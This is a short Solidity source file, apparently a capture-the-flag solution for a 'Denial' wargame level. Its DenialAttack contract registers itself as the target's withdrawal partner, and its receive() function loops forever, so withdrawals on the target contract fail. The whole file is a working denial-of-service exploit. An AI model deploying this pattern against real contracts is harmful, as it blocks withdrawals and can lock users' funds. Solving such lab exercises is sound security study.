// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDenial{ // 1) change interface name

    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttack { // 2) change nameattck

    address target;
    address partner;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {

        IDenial denialContract = IDenial(target);
        denialContract.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {}
    }
}